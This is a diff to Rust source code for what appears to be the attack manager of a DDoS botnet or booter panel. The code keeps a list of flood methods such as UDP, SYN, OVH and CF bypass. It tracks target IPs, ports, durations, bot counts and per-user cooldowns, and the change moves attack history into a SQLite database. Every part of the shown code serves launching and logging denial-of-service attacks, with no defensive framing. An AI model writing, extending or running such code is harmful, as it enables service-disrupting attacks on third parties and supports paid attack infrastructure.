@@ -3,9 +3,9 @@ use serde::{Deserialize, Serialize};
 use std::net::IpAddr;
 use tokio::sync::Mutex;
 use std::sync::Arc;
-use std::sync::atomic::{AtomicUsize, Ordering};
 use dashmap::DashMap;
 use super::auth::Level;
+use sqlx::{SqlitePool, Row};
 
 pub const VALID_ATTACK_METHODS: &[&str] = &[
     "UDP", "TCP", "HTTP", "SYN", "ACK", "STD", "VSE", "OVH", "NFO", "BYPASS", "TLS", "CF",
@@ -13,7 +13,7 @@ pub const VALID_ATTACK_METHODS: &[&str] = &[
 
 #[derive(Debug, Clone)]
 pub struct Attack {
-    pub id: usize,
+    pub id: i64,
     pub method: String,
     pub ip: IpAddr,
     pub port: u16,
@@ -36,9 +36,9 @@ impl Attack {
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct AttackHistory {
-    pub id: usize,
+    pub id: i64,
     pub method: String,
-    pub ip: IpAddr,
+    pub ip: String,
     pub port: u16,
     pub duration_secs: u64,
     pub username: String,
@@ -58,23 +58,21 @@ pub struct AttackRequest {
 }
 
 pub struct AttackManager {
-    attacks: Arc<DashMap<usize, Attack>>,
-    history: Arc<Mutex<Vec<AttackHistory>>>,
+    attacks: Arc<DashMap<i64, Attack>>,
     queue: Arc<Mutex<Vec<AttackRequest>>>,
-    next_id: Arc<AtomicUsize>,
+    pool: SqlitePool,
     max_attacks: usize,
     cooldown_secs: u64,
     max_duration_secs: u64,
-    user_last_attack: Arc<DashMap<String, Instant>>,  // Track last attack time per user
+    user_last_attack: Arc<DashMap<String, Instant>>,
 }
 
 impl AttackManager {
-    pub fn new(max_attacks: usize, cooldown_secs: u64, max_duration_secs: u64) -> Self {
+    pub fn new(max_attacks: usize, cooldown_secs: u64, max_duration_secs: u64, pool: SqlitePool) -> Self {
         Self {
             attacks: Arc::new(DashMap::new()),
-            history: Arc::new(Mutex::new(Vec::new())),
             queue: Arc::new(Mutex::new(Vec::new())),
-            next_id: Arc::new(AtomicUsize::new(1)),
+            pool,
             max_attacks,
             cooldown_secs,
             max_duration_secs,
@@ -152,10 +150,24 @@ impl AttackManager {
             return Err(format!("Invalid attack method: {}", method));
         }
 
-        let attack_id = self.next_id.fetch_add(1, Ordering::SeqCst);
+        let ip_str = ip.to_string();
+        let now = chrono::Utc::now();
+
+        let id = sqlx::query("INSERT INTO attacks (username, target_ip, target_port, method, duration, started_at, status) VALUES (?, ?, ?, ?, ?, ?, ?)")
+            .bind(&username)
+            .bind(&ip_str)
+            .bind(port)
+            .bind(&method)
+            .bind(duration_secs as i64)
+            .bind(now)
+            .bind("running")
+            .execute(&self.pool)
+            .await
+            .map_err(|e| format!("Database error: {}", e))?
+            .last_insert_rowid();
         
         let attack = Attack {
-            id: attack_id,
+            id,
             method: method.clone(),
             ip,
             port,
@@ -165,34 +177,12 @@ impl AttackManager {
             bot_count,
         };
         
-        self.attacks.insert(attack_id, attack);
+        self.attacks.insert(id, attack);
         
         // Record this attack for user cooldown
         self.user_last_attack.insert(username.clone(), Instant::now());
         
-        // Add to history
-        let history_entry = AttackHistory {
-            id: attack_id,
-            method,
-            ip,
-            port,
-            duration_secs,
-            username,
-            started_at: chrono::Utc::now().to_rfc3339(),
-            finished: false,
-        };
-        
-        let mut history = self.history.lock().await;
-        history.push(history_entry);
-        
-        // Limit history size (keep last 1000)
-        const MAX_HISTORY_SIZE: usize = 1000;
-        if history.len() > MAX_HISTORY_SIZE {
-            let remove_count = history.len() - MAX_HISTORY_SIZE;
-            history.drain(0..remove_count);
-        }
-        
-        Ok(attack_id)
+        Ok(id as usize)
     }
     
     pub async fn queue_attack(
@@ -241,12 +231,14 @@ impl AttackManager {
     }
 
     pub async fn stop_attack(&self, attack_id: usize) -> Result<(), String> {
-        if self.attacks.remove(&attack_id).is_some() {
-            // Update history
-            let mut history = self.history.lock().await;
-            if let Some(entry) = history.iter_mut().find(|e| e.id == attack_id) {
-                entry.finished = true;
-            }
+        let id = attack_id as i64;
+        if self.attacks.remove(&id).is_some() {
+            let now = chrono::Utc::now();
+            let _ = sqlx::query("UPDATE attacks SET status = 'finished', finished_at = ? WHERE id = ?")
+                .bind(now)
+                .bind(id)
+                .execute(&self.pool)
+                .await;
             Ok(())
         } else {
             Err(format!("Attack {} not found", attack_id))
@@ -255,17 +247,19 @@ impl AttackManager {
 
     pub async fn stop_all_attacks(&self) -> Vec<usize> {
         let mut stopped_ids = Vec::new();
-        let mut history = self.history.lock().await;
         
         // Collect IDs to remove
-        let ids: Vec<usize> = self.attacks.iter().map(|a| *a.key()).collect();
+        let ids: Vec<i64> = self.attacks.iter().map(|a| *a.key()).collect();
         
         for id in ids {
             if self.attacks.remove(&id).is_some() {
-                stopped_ids.push(id);
-                if let Some(entry) = history.iter_mut().find(|e| e.id == id) {
-                    entry.finished = true;
-                }
+                stopped_ids.push(id as usize);
+                let now = chrono::Utc::now();
+                let _ = sqlx::query("UPDATE attacks SET status = 'finished', finished_at = ? WHERE id = ?")
+                    .bind(now)
+                    .bind(id)
+                    .execute(&self.pool)
+                    .await;
             }
         }
         
@@ -273,7 +267,7 @@ impl AttackManager {
     }
     
     pub async fn get_attack(&self, attack_id: usize) -> Option<Attack> {
-        self.attacks.get(&attack_id).map(|a| a.clone())
+        self.attacks.get(&(attack_id as i64)).map(|a| a.clone())
     }
     
     pub async fn get_all_attacks(&self) -> Vec<Attack> {
@@ -289,14 +283,30 @@ impl AttackManager {
     }
     
     pub async fn get_history(&self, limit: usize) -> Vec<AttackHistory> {
-        let history = self.history.lock().await;
-        history.iter().rev().take(limit).cloned().collect()
+        let rows = sqlx::query("SELECT id, method, target_ip, target_port, duration, username, started_at, status FROM attacks ORDER BY started_at DESC LIMIT ?")
+            .bind(limit as i64)
+            .fetch_all(&self.pool)
+            .await
+            .unwrap_or_default();
+
+        rows.into_iter().map(|row| {
+            let status: String = row.get("status");
+            let started_at: chrono::DateTime<chrono::Utc> = row.get("started_at");
+            AttackHistory {
+                id: row.get("id"),
+                method: row.get("method"),
+                ip: row.get("target_ip"),
+                port: row.get("target_port"),
+                duration_secs: row.get::<i64, _>("duration") as u64,
+                username: row.get("username"),
+                started_at: started_at.to_rfc3339(),
+                finished: status == "finished",
+            }
+        }).collect()
     }
     
     pub async fn cleanup_finished(&self) {
-        let mut history = self.history.lock().await;
-        
-        let finished_ids: Vec<usize> = self.attacks
+        let finished_ids: Vec<i64> = self.attacks
             .iter()
             .filter(|a| a.is_finished())
             .map(|a| a.id)
@@ -304,9 +314,12 @@ impl AttackManager {
         
         for id in finished_ids {
             self.attacks.remove(&id);
-            if let Some(entry) = history.iter_mut().find(|e| e.id == id) {
-                entry.finished = true;
-            }
+            let now = chrono::Utc::now();
+            let _ = sqlx::query("UPDATE attacks SET status = 'finished', finished_at = ? WHERE id = ?")
+                .bind(now)
+                .bind(id)
+                .execute(&self.pool)
+                .await;
         }
     }
     
@@ -314,38 +327,10 @@ impl AttackManager {
         self.attacks.len()
     }
     
-    /// Save attack history to file
-    pub async fn save_history(&self, path: &str) -> Result<(), String> {
-        let history = self.history.lock().await;
-        let json = serde_json::to_string_pretty(&*history)
-            .map_err(|e| format!("Failed to serialize history: {}", e))?;
-        
-        tokio::fs::write(path, json).await
-            .map_err(|e| format!("Failed to write history: {}", e))?;
-        
-        Ok(())
-    }
-    
-    /// Load attack history from file
-    pub async fn load_history(&self, path: &str) -> Result<(), String> {
-        if !std::path::Path::new(path).exists() {
-            return Ok(()); // No history file yet
-        }
-        
-        let contents = tokio::fs::read_to_string(path).await
-            .map_err(|e| format!("Failed to read history: {}", e))?;
-        
-        let loaded_history: Vec<AttackHistory> = serde_json::from_str(&contents)
-            .map_err(|e| format!("Failed to parse history: {}", e))?;
-        
-        // Find max ID to ensure we don't reuse IDs
-        let max_id = loaded_history.iter().map(|h| h.id).max().unwrap_or(0);
-        self.next_id.store(max_id + 1, Ordering::SeqCst);
-        
-        let mut history = self.history.lock().await;
-        *history = loaded_history;
-        
-        Ok(())
+    pub async fn cleanup_stale_attacks(&self) {
+        let _ = sqlx::query("UPDATE attacks SET status = 'interrupted', finished_at = CURRENT_TIMESTAMP WHERE status = 'running'")
+            .execute(&self.pool)
+            .await;
     }
 }
 
